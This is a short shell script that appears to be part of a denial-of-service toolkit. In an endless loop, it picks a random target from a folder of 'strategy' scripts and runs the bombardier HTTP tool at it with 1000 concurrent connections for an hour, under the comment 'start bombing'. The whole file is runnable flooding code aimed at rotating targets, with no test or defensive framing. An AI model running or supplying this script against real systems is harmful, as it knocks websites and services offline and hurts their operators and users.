#!/bin/sh

while true; do
  # get random resource from random strategy
  RESOURCE=$(sh strategies/resources/$(ls strategies/resources | shuf | head -n1))

  # start bombing
  bombardier -c 1000 -d 3600s -l $RESOURCE
done
